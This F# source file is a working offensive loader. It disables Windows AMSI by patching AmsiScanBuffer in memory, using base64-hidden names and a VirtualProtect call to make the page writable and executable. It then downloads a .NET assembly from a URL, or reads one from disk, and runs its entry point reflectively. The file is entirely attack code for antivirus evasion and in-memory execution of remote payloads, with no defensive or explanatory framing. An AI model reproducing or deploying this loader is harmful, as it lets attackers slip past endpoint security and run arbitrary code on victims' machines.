open System
open System.IO
open System.Text
open System.Reflection
open System.Net
open System.Runtime.InteropServices

[<DllImport("kernel32", SetLastError = true)>]
extern nativeint LoadLibrary(string name);
let LoadLibrarySafe (name:string): Result<nativeint, string> =
    match LoadLibrary name with
    | ptr when ptr = IntPtr.Zero -> Error (sprintf "[-] LoadLibrary failed: %s" (Marshal.GetLastWin32Error().ToString()))
    | data -> Ok data

[<DllImport("kernel32", SetLastError = true)>]
extern nativeint GetProcAddress(nativeint hModule, string procName)
let GetProcAddressSafe (hModule: nativeint, procName: string): Result<nativeint, string> =
    match GetProcAddress(hModule, procName) with
    | ptr when ptr = IntPtr.Zero -> Error (sprintf "[-] GetProcAddress failed: %s" (Marshal.GetLastWin32Error().ToString()))
    | data -> Ok data

[<DllImport("kernel32", SetLastError = true)>]
extern Boolean VirtualProtect(nativeint lpAddress, unativeint dwSize, uint flNewProtect, uint& lpflOldProtect)
let VirtualProtectSafe(lpAddress: nativeint, dwSize: unativeint, flNewProtect: uint): Result<nativeint, string> =
    let mutable oldProtect = 0u
    match VirtualProtect(lpAddress, dwSize, flNewProtect, &oldProtect) with
    | false ->  Error (sprintf "[-] VitrualProtect failed: %s" (Marshal.GetLastWin32Error().ToString()))
    | true  ->  Ok lpAddress

type Command = {
    isBase64Encoded: bool;
    path: string;
    arguments: string list;
}

let patchAMSI = 
    let patch: byte array =
        match System.Environment.Is64BitOperatingSystem with
        | true  -> [| 0xB8uy; 0x57uy; 0x00uy; 0x07uy; 0x80uy; 0xC3uy |]
        | false -> [| 0xB8uy; 0x57uy; 0x00uy; 0x07uy; 0x80uy; 0xC2uy; 0x18uy; 0x00uy |]

    LoadLibrarySafe(Encoding.UTF8.GetString(Convert.FromBase64String("YU1zSS5kTGw=")))
    |> Result.bind (fun lib -> GetProcAddressSafe (lib, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="))))
    |> Result.bind (fun addr -> VirtualProtectSafe(addr, unativeint patch.Length, 0x40u))
    |> Result.bind (fun addr -> 
        try
            Marshal.Copy(patch, 0, addr, patch.Length) |> Ok
        with
        | e -> Error (sprintf "Marshal.Copy failed: %s" e.Message)
    )

let loadFromFile (path: string): Result<byte array, string> =
    try
        File.ReadAllBytes path |> Ok
    with
    | :? FileNotFoundException -> Error $"File not found: {path}"
    | e                   -> Error (sprintf "Unexpected error: %s" e.Message) 

let loadFromURL (url: string): Result<byte array, string> = 
    try
        (new WebClient()).DownloadData(url) |> Ok
    with
    | :? WebException as e -> Error (sprintf "Network Error: %s" e.Message)
    | e                             -> Error (sprintf "Unexpected error: %s" e.Message) 

let loadBytes command = 
    if command.path.StartsWith "http://" || command.path.StartsWith "https://" 
            then loadFromURL command.path
            else loadFromFile command.path

let loadAsm (bytes: byte array) =
    printfn "[+] Load assembly"
    try
        Assembly.Load bytes |> Ok
    with
    | :? ArgumentNullException -> Error "Bad argument specified"
    | :? BadImageFormatException -> Error "Bad format assembly loaded"
    | e -> Error (sprintf "Unexpected error: %s" e.Message) 

let invokeEntryPoint (asm: Assembly, args: string array) =
    printfn "[+] Invoke entrypoint"
    try
        asm.EntryPoint.Invoke(null, [| args :> obj |]) |> Ok
    with
    | :? TargetException as e -> Error (sprintf "Target exception: %s" e.Message)
    | e -> Error (sprintf "Unexpected error: %s" e.Message) 

let executeCommand (command: Command) = 
    loadBytes command
    |> Result.bind loadAsm
    |> Result.bind (fun asm -> invokeEntryPoint (asm, List.toArray command.arguments))

let rec parseArg (args: string list) =
    match args with
    | x::xs -> 
        let command = parseArg xs
        if   x = "-b64"  then { command with isBase64Encoded = true }
        elif x = "-path" then { parseArg xs[1..] with path = xs[0] }
        elif x = "-args" then { command with arguments = xs }
        else command
    | []    -> { isBase64Encoded = false; path = ""; arguments = [] }

[<EntryPoint>]
let main args = 
    match patchAMSI with
    | Ok () -> printfn "[+] AMSI successfuly patched" 
    | Error e -> failwith (sprintf "Error: %s" e)

    let command = parseArg (Array.toList args)

    match executeCommand command with
    | Ok result -> 0
    | Error e -> failwith (sprintf "Error: %s" e)
